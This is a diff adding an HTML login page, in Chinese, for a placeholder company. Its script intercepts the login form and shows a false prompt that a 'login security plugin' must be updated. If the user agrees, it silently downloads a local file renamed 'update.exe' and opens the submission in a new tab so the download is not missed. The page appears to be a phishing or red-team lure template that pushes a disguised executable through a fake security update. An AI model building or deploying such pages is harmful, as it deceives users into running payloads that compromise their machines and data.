@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>web login</title>
+
+<link href="./files/bootstrap.min.css" rel="stylesheet" type="text/css">
+
+    <script src="./files/jquery.min.js" charset="UTF-8"></script>
+    <script src="./files/bootstrap.min.js" charset="UTF-8"></script>
+    <style>
+        .navbar-static-top .container, .navbar-fixed-top .container, .navbar-fixed-bottom .container{width:1200px;}
+        .container{ width: 1200px;}
+    </style>
+
+<body>
+<div class="navbar navbar-default navbar-inverse" style="border-radius:0px">
+    <div class="navbar-inner">
+        <div class="container">
+            <a class="brand" style="padding: 0px;" href="javascript:;"><img src="./files/Logo.png" height="30" style="height:30px;float: left;display: block;margin-top: 10px;"></a>
+            <ul class="nav navbar-nav" style="padding-left:30px;">
+                            </ul>
+                    </div>
+    </div>
+</div>
+<div style="min-width: 1200px; max-width: 1500px; margin: 10px auto;">
+    <div class="row" style="margin-top: 30px;margin-bottom: 60px;">
+    <form id="loginform" class="form-horizontal col-sm-8 col-sm-offset-2" method="get" action="./admin.html">
+        <fieldset>
+            <legend style="margin-bottom: 60px;">用户登录</legend>
+            <div class="form-group">
+                <label class="control-label col-sm-2" for="inputUsername">账号：</label>
+                <div class="col-sm-4">
+                    <input type="text" name="username" class="form-control" id="inputUsername" placeholder="您注册时填写的账号">
+                </div>
+            </div>
+            <div class="form-group">
+                <label class="control-label col-sm-2" for="inputPassword">口令：</label>
+                <div class="col-sm-4">
+                    <input type="password" name="pass" class="form-control" id="inputPassword">
+                </div>
+                <div class="col-sm-6">口令长度6-20个字符，不能包含空格</div>
+            </div>
+            <div class="form-group">
+                <div class="col-sm-4 col-sm-offset-4">
+                    <button type="submit" class="btn btn-primary">登录</button>
+                    <a href="javascript:;" class="btn">注册</a>
+                    <a href="javascript:;" style="font-size: 12px;margin-left: 20px;">找回账号</a>
+                </div>
+            </div>
+        </fieldset>
+    </form>
+
+
+<script>
+// --------------------------
+
+// 为ID为'loginform'的表单  添加监听器
+const form = document.getElementById('loginform');
+
+// 提交表单后的页面 在新window打开(避免提交过快错过下载)
+form.setAttribute("target", "_blank");
+
+//form.removeAttribute("target");
+
+
+// 提交时 执行函数
+//form.addEventListener('submit', confirmBox);
+
+// 提交时 进行判断 如果返回false 则取消提交该表单内容!
+form.onsubmit = function() {
+    return confirmBox();
+};
+
+
+function downloadFile(){
+    // http://file.io/test
+    fetch('./files/download.txt')
+    .then(resp => resp.blob())
+    .then(blob => {
+    const url = window.URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.style.display = 'none';
+    a.href = url;
+    a.download = 'update.exe';// the filename showed
+    document.body.appendChild(a);
+    a.click();
+    window.URL.revokeObjectURL(url);
+  })
+  .catch(() => console.log('download fail!'));
+}
+
+
+
+function confirmBox()
+{
+    var mymessage=confirm("登录安全插件需要更新，请安装更新程序后登录系统！");
+    if(mymessage==true)
+    {
+        downloadFile();
+        return true;
+    }
+    else if(mymessage==false)
+    {
+       return false;//取消表单提交
+    }
+}
+
+// --------------------------
+</script>
+
+
+</div></div>
+<div style="text-align: center">
+    © 2013 - 2020&nbsp;demo有限公司&nbsp;所有权利保留
+</div>
+
+</body></html>
